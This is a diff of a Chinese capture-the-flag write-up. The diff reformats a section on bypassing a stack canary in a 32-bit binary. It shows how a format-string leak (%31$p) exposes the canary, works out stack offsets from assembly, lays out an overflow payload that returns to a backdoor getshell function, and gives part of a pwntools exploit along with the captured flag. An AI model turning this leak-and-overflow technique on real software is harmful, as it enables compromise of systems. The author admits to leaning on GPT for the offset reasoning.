@@ -220,68 +220,125 @@ r.interactive()
 ![ez6](images/eztext6.webp)
 最后我们再/bin/flag处发现flag，用cat bin/flag\n命令得到flag。
 ## Canary
-什么是Canary？Canary 的核心原理可以一句话概括：在函数返回地址前面放一个随机值，函数返回前检查这个值有没有被改掉；如果被改了，就认为发生了栈溢出，直接终止程序。
-所以我们想要获取shell就需要绕过Canary。而绕过的核心思路就是先泄露canary，再原样写回canary，然后继续覆盖返回地址。
-接下来我们完整的来做一遍：
-我们checksec发现程序是 32 位 ELF，Canary found,打开ida，发现存在一个后门函数：`getshell = 0x080491c6`。
+
+什么是 Canary？
+
+Canary 的核心原理可以一句话概括：在函数返回地址前面放一个随机值，函数返回前检查这个值有没有被改掉；如果被改了，就认为发生了栈溢出，直接终止程序。
+
+所以我们想要获取 shell，就需要绕过 Canary。绕过的核心思路是：先泄露 canary，再原样写回 canary，然后继续覆盖返回地址。
+
+接下来完整地做一遍。
+
+我们 `checksec` 发现程序是 32 位 ELF，并且开启了 `Canary found`。打开 IDA 后，发现存在一个后门函数：`getshell = 0x080491c6`。
+
 ![canary](images/canary1.webp)
-程序里的 vuln()有两个漏洞--第一个漏洞是格式化字符串`printf(buf)`用户输入被直接当成格式化字符串使用，所以可以泄露栈上的 canary;第二个漏洞是栈溢出：`read(0, buf, 0x200)`buf 只有一百多字节，但 read 最多读入 0x200 字节，因此可以覆盖栈上的 canary、saved ebp 和返回地址。程序循环执行两次输入，所以正好可以：
-第一次输入：泄露 canary
-第二次输入：栈溢出 ret2getshell
-然后就是怎么泄漏canary了，我们需要知道Canary的地址，那怎么算呢？我们是可以通过汇编来算的(*汇编这一块我现在暂时还是没太搞懂*)，GPT是这么说的：
+
+程序里的 `vuln()` 有两个漏洞：
+
+- 格式化字符串漏洞：`printf(buf)` 中用户输入被直接当成格式化字符串使用，所以可以泄露栈上的 canary。
+- 栈溢出漏洞：`read(0, buf, 0x200)` 中 `buf` 只有一百多字节，但 `read` 最多读入 `0x200` 字节，因此可以覆盖栈上的 canary、saved ebp 和返回地址。
+
+程序会循环执行两次输入，所以正好可以这样利用：
+
+1. 第一次输入：泄露 canary。
+2. 第二次输入：栈溢出，ret2getshell。
+
+然后就是怎么泄漏 canary 了。我们需要知道 Canary 的位置，那怎么算呢？可以通过汇编来算。（*汇编这一块我现在暂时还是没太搞懂*）GPT 是这么说的：
+
 先看关键汇编，vuln() 中和 canary、printf 相关的汇编是：
-```python
-sub esp, 0x78  
-  
-mov eax, gs:0x14  
-mov [ebp-0xc], eax        ; canary 保存在 ebp-0xc  
-  
-...  
-  
-lea eax, [ebp-0x70]       ; buf 地址  
-push eax  
-call printf  
-```  
-也就是说：  
-buf    在 ebp - 0x70  
-canary 在 ebp - 0x0c  
-栈大概长这样：  
-低地址  
-buf                  ebp - 0x70  
-...  
-canary               ebp - 0x0c  
-saved ebp            ebp  
-return address       ebp + 4  
-高地址  
-在进入 printf 的时候：  
-esp = ebp - 0x8c  
-所以：  
-`%1$p`读的位置是 ebp - 0x84  
-`%2$p`读的位置是 ebp - 0x80  
-`%3$p`读的位置是 ebp - 0x7c  
-...  
-而 canary 在：  
-ebp - 0x0c  
-计算：  
-第 1 个参数位置 = ebp - 0x84  
-canary 位置     = ebp - 0x0c  
-距离是：  
-0x84 - 0x0c = 0x78  
-每个参数在 32 位程序里占 4 字节，所以：0x78 / 4 = 30。因为 %1$p 是第一个位置，所以：1 + 30 = 31，因此 canary 正好是：%31$p
+
+```asm
+sub esp, 0x78
+
+mov eax, gs:0x14
+mov [ebp-0xc], eax        ; canary 保存在 ebp-0xc
+
+...
+
+lea eax, [ebp-0x70]       ; buf 地址
+push eax
+call printf
+```
+
+也就是说：
+
+| 内容 | 位置 |
+| --- | --- |
+| `buf` | `ebp - 0x70` |
+| `canary` | `ebp - 0x0c` |
+
+栈大概长这样：
+
+```text
+低地址
+
+buf                  ebp - 0x70
+...
+canary               ebp - 0x0c
+saved ebp            ebp
+return address       ebp + 4
+
+高地址
+```
+
+在进入 `printf` 的时候：
+
+```text
+esp = ebp - 0x8c
+```
+
+所以：
+
+| 格式化字符串参数 | 读取位置 |
+| --- | --- |
+| `%1$p` | `ebp - 0x84` |
+| `%2$p` | `ebp - 0x80` |
+| `%3$p` | `ebp - 0x7c` |
+
+而 canary 在：
+
+```text
+ebp - 0x0c
+```
+
+计算一下：
+
+```text
+第 1 个参数位置 = ebp - 0x84
+canary 位置     = ebp - 0x0c
+
+距离 = 0x84 - 0x0c = 0x78
+```
+
+每个参数在 32 位程序里占 4 字节，所以：`0x78 / 4 = 30`。
+
+因为 `%1$p` 是第一个位置，所以：`1 + 30 = 31`，因此 canary 正好是：`%31$p`。
+
 ![canary](images/canary2.webp)
-算出偏移(~~应该可以这么说吧？~~)后我们就可以写exp来拿shell了。  
-我们还要注意栈里的结构是这样的(主要是经典 32 位 x86 程序的调用约定（cdecl）决定的):  
-buf  
-canary  
-padding (8 bytes)  
-saved ebp  
-return address  
-因此payload 结构：  
-0x64 bytes   -> 填满 buf  
-4 bytes      -> 正确 canary  
-12 bytes     -> padding + saved ebp  
-4 bytes      -> 覆盖返回地址  
-所以最终exp应该这么写：
+
+算出偏移（~~应该可以这么说吧？~~）后，我们就可以写 exp 来拿 shell 了。
+
+还要注意栈里的结构是这样的，主要由经典 32 位 x86 程序的调用约定（cdecl）决定：
+
+```text
+buf
+canary
+padding (8 bytes)
+saved ebp
+return address
+```
+
+因此 payload 结构如下：
+
+| 长度 | 作用 |
+| --- | --- |
+| `0x64 bytes` | 填满 `buf` |
+| `4 bytes` | 正确的 canary |
+| `12 bytes` | padding + saved ebp |
+| `4 bytes` | 覆盖返回地址 |
+
+所以最终 exp 应该这么写：
+
 ```python
 from pwn import *
 import re
@@ -313,5 +370,9 @@ payload2 += p32(GETSHELL)
 io.send(payload2)
 io.interactive()
 ```
+
 ![canary](images/canary3.webp)
+
+```text
 ISCC{a697a6be-faed-4359-aa17-06d9fd12e81c}
+```
